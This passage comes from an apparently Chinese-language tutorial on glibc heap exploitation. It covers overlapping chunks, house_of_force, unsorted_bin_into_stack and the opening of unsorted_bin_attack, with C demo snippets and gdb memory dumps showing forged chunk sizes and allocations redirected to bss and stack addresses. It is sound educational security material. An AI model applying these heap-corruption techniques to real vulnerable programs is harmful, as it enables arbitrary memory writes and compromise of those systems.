class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603440</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603450</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603460</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603470</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603480</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure>

<p> chunk 2 的 size 值修改为 chunk 2 和 chunk 3 的大小之和，最后的 1 是标志位。这样当我们释放 chunk 2 的时候，malloc 根据这个被修改的 size 值，会以为 chunk 2 加上 chunk 3 的区域都是要释放的，然后就错误地修改了 chunk 5 的 prev_size。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">59</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line"><span class="number">60</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line"><span class="number">61</span>   <span class="built_in">free</span>(p2);</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p p5</span><br><span class="line"><span class="variable">$5</span> = (intptr_t *) 0x603fd0</span><br><span class="line">PwnLife&gt; x/20gx p5-2</span><br><span class="line">0x603fc0:	0x0000000000000bd0	0x00000000000003f0   &lt;--- prev size / size</span><br><span class="line">0x603fd0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603fe0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603ff0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604000:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604010:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604020:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604030:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604040:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604050:	0x4545454545454545	0x4545454545454545</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure>

<p>我们会发现，当free 掉 chunk 2 后， chunk 2 ，chunk 3 一起被释放，接着，它发现紧邻的一块 chunk 4 也是 free 状态，就把它俩合并在了一起，组成一个大 free chunk，放进 unsorted bin 中。 chunk 5 的 prev size 也发生了变化。</p>
<p>然后当我们申请一块新chunk的时候，会从 unsorted bin中取出一部分，比如这里我们申请一块 p6</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br></pre></td></tr></table></figure>

<p>即将 chunk 2 chunk 3 的部分拿出来。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p p6</span><br><span class="line"><span class="variable">$6</span> = (intptr_t *) 0x603400</span><br><span class="line">PwnLife&gt; x/20gx p6-2</span><br><span class="line">0x6033f0:	0x4141414141414141	0x00000000000007e1</span><br><span class="line">0x603400:	0x00007ffff7dd2138	0x00007ffff7dd2138</span><br><span class="line">0x603410:	0x00000000006033f0	0x00000000006033f0</span><br><span class="line">0x603420:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603430:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603440:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603450:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603460:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603470:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603480:	0x4242424242424242	0x4242424242424242</span><br></pre></td></tr></table></figure>



<p>然后 unsorted bin中剩下的部分就是 chunk4</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x603bd0 ◂— 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">PwnLife&gt; x/20gx 0x603bd0</span><br><span class="line">0x603bd0:	0x4343434343434343	0x00000000000003f1</span><br><span class="line">0x603be0:	0x00007ffff7dd1b58	0x00007ffff7dd1b58</span><br><span class="line">0x603bf0:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c00:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c10:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c20:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c30:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c40:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c50:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c60:	0x4444444444444444	0x4444444444444444</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure>



<p>这个时候，chunk 6 和chunk 3就已经是同一块 chunk了。</p>
<h3 id="0x11-house-of-force"><a href="#0x11-house-of-force" class="headerlink" title="0x11 house_of_force"></a>0x11 house_of_force</h3><p>Exploiting the Top Chunk (Wilderness) header in order to get malloc to return a nearly-arbitrary pointer</p>
<p>house_of_force 是一种通过改写 top chunk 的 size 字段来欺骗 malloc 返回任意地址的技术。我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top chunk，当 bins 和 fast bins 都不能满足分配需要的时候，malloc 会从 top chunk 中分出一块内存给用户。所以 top chunk 的大小会随着分配和回收不停地变化。</p>
<p>首先随便 malloc 一个 chunk</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/20gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000111</span><br><span class="line">0x603010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">PwnLife&gt;</span><br><span class="line">0x6030a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603110:	0x0000000000000000	0x0000000000020ef1             &lt;--- top chunk</span><br><span class="line">0x603120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603130:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>



<p>这个时候我们假设 第一个chunk 有溢出漏洞，我们可以去修改。top chunk 的size</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/20gx 0x603100</span><br><span class="line">0x603100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603110:	0x0000000000000000	0xffffffffffffffff         &lt;--- top chunk </span><br><span class="line">0x603120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603190:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>我们发现，这个时候size被修改为一个 大数。</p>
<p>现在我们可以 malloc 一个任意大小的内存而不用调用 mmap 了。接下来 malloc 一个 chunk，使得该 chunk 刚好分配到我们想要控制的那块区域为止，这样在下一次 malloc 时，就可以返回到我们想要控制的区域了。计算方法是用目标地址减去 top chunk 地址，再减去 chunk 头的大小。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">67</span> 	<span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="number">68</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line"><span class="number">69</span> 	   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="number">70</span> 	<span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br></pre></td></tr></table></figure>

<p>这样就成功把。bss_var 给分配了出来</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">0x602050 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x10b9,</span><br><span class="line">  fd = 0x2073692073696854,</span><br><span class="line">  bk = 0x676e697274732061,</span><br><span class="line">  fd_nextsize = 0x6577207461687420,</span><br><span class="line">  bk_nextsize = 0x6f7420746e617720</span><br><span class="line">&#125;</span><br><span class="line">0x603108 &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x0,</span><br><span class="line">  fd = 0xffffffffffffef41,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">PwnLife&gt; x/20s 0x602050</span><br><span class="line">0x602050:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x602051:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x602052:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x602053:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x602054:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x602055:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x602056:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x602057:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x602058:	<span class="string">&quot;\271\020&quot;</span></span><br><span class="line">0x60205b:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x60205c:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x60205d:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x60205e:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x60205f:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x602060 &lt;bss_var&gt;:	<span class="string">&quot;This is a strin&quot;</span>...</span><br><span class="line">0x60206f &lt;bss_var+15&gt;:	<span class="string">&quot;g that we want &quot;</span>...</span><br><span class="line">0x60207e &lt;bss_var+30&gt;:	<span class="string">&quot;to overwrite.&quot;</span></span><br><span class="line">0x60208c:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x60208d:	<span class="string">&quot;&quot;</span></span><br><span class="line">0x60208e:	<span class="string">&quot;&quot;</span></span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure>

<p>该技术的缺点是会受到 ASLR 的影响，因为如果攻击者需要修改指定位置的内存，他首先需要知道当前 top chunk 的位置以构造合适的 malloc 大小来转移 top chunk。而 ASLR 将使堆内存地址随机，所以该技术还需同时配合使用信息泄漏以达成攻击。</p>
<h3 id="0x12-unsorted-bin-into-stack"><a href="#0x12-unsorted-bin-into-stack" class="headerlink" title="0x12 unsorted_bin_into_stack"></a>0x12 unsorted_bin_into_stack</h3><p>unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出 chunk。</p>
<p>首先，我们得先malloc 一块 chunk，然后 free 掉，将他放到 unsorted bin里。再这之前，我们也得 malloc 一块 作为缓冲的chunk ，避免目标chunk free 掉后被放入到 topchunk里。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">9</span>   <span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line"><span class="number">12</span>   <span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="number">14</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line"><span class="number">15</span>   <span class="built_in">free</span>(victim);</span><br></pre></td></tr></table></figure>



<p>这个时候 victim 就被放入到了 unsortedbin里</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x602000 ◂— 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>



<p>紧接着，我们在栈上 fake 一个chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">19</span>   stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line"><span class="number">20</span>   stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p stack_buffer</span><br><span class="line"><span class="variable">$3</span> = &#123;0x0, 0x110, 0x0, 0x7fffffffe3f0&#125;</span><br><span class="line">PwnLife&gt; p &amp;stack_buffer</span><br><span class="line"><span class="variable">$4</span> = (intptr_t (*)[4]) 0x7fffffffe3f0</span><br></pre></td></tr></table></figure>

<p>让伪造的 chunk 的bk 指向自身。</p>
<p>然后我们假设，此时有一个 堆溢出漏洞，可以修改 victim chunk的内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">24</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line"><span class="number">25</span>   victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line"><span class="number">26</span>   victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"><span class="number">27</span>   <span class="comment">//------------------------------------</span></span><br></pre></td></tr></table></figure>



<p>我们通过 溢出漏洞修改 victim chunk 的bk，但此前，我们得 pass 一个check</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Size should be different from the next request size to <span class="keyword">return</span> fake_chunk <span class="keyword">and</span> need to pass the check <span class="number">2</span>*SIZE_SZ (&gt; <span class="number">16</span> on x64) &amp;&amp; &lt; av-&gt;system_mem</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">25</span>   victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line"><span class="number">26</span>   victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br></pre></td></tr></table></figure>

<p>之后，</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p victim</span><br><span class="line"><span class="variable">$6</span> = (intptr_t *) 0x602010</span><br><span class="line">PwnLife&gt; x/20gx victim</span><br><span class="line">0x602010:	0x00007ffff7dd1b58	0x00007fffffffe3f0</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">PwnLife&gt; x/20gx victim-2</span><br><span class="line">0x602000:	0x0000000000000000	0x0000000000000020</span><br><span class="line">0x602010:	0x00007ffff7dd1b58	0x00007fffffffe3f0   &lt;--- fd,bk /bk --&gt; fake chunk</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">PwnLife&gt; x/20gx 0x00007fffffffe3f0                 &lt;--- fake chunk</span><br><span class="line">0x7fffffffe3f0:	0x0000000000000000	0x0000000000000110</span><br><span class="line">0x7fffffffe400:	0x0000000000000000	0x00007fffffffe3f0</span><br><span class="line">0x7fffffffe410:	0x00007fffffffe500	0x3fe51d8840ce6c00</span><br><span class="line">0x7fffffffe420:	0x0000000000400860	0x00007ffff7a303f1</span><br><span class="line">0x7fffffffe430:	0x0000000000040000	0x00007fffffffe508</span><br><span class="line">0x7fffffffe440:	0x00000001f7b9a488	0x0000000000400686</span><br><span class="line">0x7fffffffe450:	0x0000000000000000	0xda692c6b09ba7393</span><br><span class="line">0x7fffffffe460:	0x0000000000400590	0x00007fffffffe500</span><br><span class="line">0x7fffffffe470:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffe480:	0x2596d314d11a7393	0x2596c3ad1e287393</span><br></pre></td></tr></table></figure>

<p>那么此时就相当于 fake chunk 已经被链接到 unsorted bin 中。在下一次 malloc 的时候，malloc 会顺着 bk 指针进行遍历，于是就找到了大小正好合适的 fake chunk：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b68 (main_arena+104) —▸ 0x602000 ◂— 0x7ffff7dd1b68</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x7ffff7dd1b68 (main_arena+104) —▸ 0x602000 ◂— 0x7ffff7dd1b68</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>fake chunk 被取出，而 victim chunk 被从 unsorted bin 中取出来放到了 small bin 中。另外值得注意的是 fake chunk 的 fd 指针被修改了，这是 unsorted bin 的地址，通过它可以泄露 libc 地址，这正是下面 unsorted bin attack 会讲到的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line"><span class="number">30</span>   <span class="keyword">intptr_t</span>* fake = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">// malloc a new chunk from fake chunk.</span></span><br><span class="line"><span class="number">31</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x100): %p\n&quot;</span>, fake);</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/20gx fake-2</span><br><span class="line">0x7fffffffe3f0:	0x0000000000000000	0x0000000000000110   &lt;-- chunk</span><br><span class="line">0x7fffffffe400:	0x00007ffff7dd1b58	0x00007fffffffe3f0     &lt;---fd ,bk //new fd ---&gt; 0x7ffff7dd1b58</span><br><span class="line">0x7fffffffe410:	0x00007fffffffe500	0x29b3145efbaf1600</span><br><span class="line">0x7fffffffe420:	0x0000000000400860	0x00007ffff7a303f1</span><br><span class="line">0x7fffffffe430:	0x0000000000040000	0x00007fffffffe508</span><br><span class="line">0x7fffffffe440:	0x00000001f7b9a488	0x0000000000400686</span><br><span class="line">0x7fffffffe450:	0x0000000000000000	0x595c9e280b1d3a76</span><br><span class="line">0x7fffffffe460:	0x0000000000400590	0x00007fffffffe500</span><br><span class="line">0x7fffffffe470:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffe480:	0xa6a36157d3bd3a76	0xa6a371ee1c8f3a76</span><br></pre></td></tr></table></figure>



<h3 id="0x13-unsorted-bin-attack"><a href="#0x13-unsorted-bin-attack" class="headerlink" title="0x13 unsorted_bin_attack"></a>0x13 unsorted_bin_attack</h3><p>unsorted bin 攻击通常是为更进一步的攻击做准备的，我们知道 unsorted bin 是一个双向链表，在分配时会通过 unlink 操作将 chunk 从链表中移除，所以如果能够控制 unsorted bin chunk 的 bk 指针，就可以向任意位置写入一个指针。这里通过 unlink 将 libc 的信息写入到我们可控的内存中，从而导致信息泄漏，为进一步的攻击提供便利。</p>
<p>unlink 的对 unsorted bin 的操作是这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>



<p>首先，分配 两个 chunk，释放第一个 使其加入到 unstorted bin</p>
